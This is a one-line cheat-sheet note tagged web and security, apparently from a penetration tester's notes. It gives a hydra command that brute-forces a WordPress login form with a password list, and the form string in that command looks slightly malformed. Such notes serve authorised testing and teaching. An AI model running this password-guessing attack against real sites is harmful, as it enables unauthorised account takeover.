---
tags:
  - web
  - security
---
A tool to brute force logins on the web
```
hydra -l <user> -P passwords.txt domain.com http-post-form "/?wp-login.php:log=^USER&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -v
```